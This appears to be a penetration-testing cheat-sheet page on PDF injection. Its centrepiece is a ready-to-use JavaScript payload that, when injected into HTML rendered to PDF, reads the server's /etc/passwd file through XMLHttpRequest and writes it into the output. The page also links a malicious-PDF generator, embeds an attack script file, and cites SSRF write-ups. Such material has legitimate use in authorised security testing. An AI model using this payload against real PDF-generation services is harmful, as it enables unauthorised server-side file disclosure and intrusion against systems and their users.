# PDF Injection

### Payload

* <pre class="language-javascript" data-line-numbers><code class="lang-javascript">// SSRF - Local File Read
  &#x3C;script>
      x=new XMLHttpRequest;
      x.onload=function(){  
      document.write(this.responseText)};
      x.open("GET","file:///etc/passwd");
      x.send();
  &#x3C;/script>
  </code></pre>
* [malicious-pdf](https://github.com/jonaslejon/malicious-pdf)

{% file src="../../.gitbook/assets/xss2pdf.py" %}

### References

* [ssrf-to-local-file-read-through-html-injection-in-pdf-file](https://namratha-gm.medium.com/ssrf-to-local-file-read-through-html-injection-in-pdf-file-53711847cb2f)
* [finding-ssrf-via-html-injection-inside-a-pdf-file-on-aws-ec2](https://appsecco.com/blog/finding-ssrf-via-html-injection-inside-a-pdf-file-on-aws-ec2)
